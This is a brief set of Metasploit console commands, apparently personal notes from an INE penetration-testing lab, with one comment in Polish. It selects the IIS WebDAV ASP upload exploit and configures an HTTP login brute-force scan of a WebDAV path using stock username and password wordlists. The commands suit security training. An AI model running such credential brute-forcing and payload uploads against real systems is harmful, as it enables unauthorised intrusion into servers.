```bash
msf> use exploit/windows/iis/iis_webdav_upload_asp
msf> setg PATH /webdav/metsploit.asp # pamiętać o zmianie ścieżki
```
```bash
msf> use auxiliary/scanner/http/http_login
msf> set RHOSTS demo.ine.local
msf> set AUTH_URI /webdav/
msf> set USER_FILE  /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf> set VERBOSE false
msf> exploit
```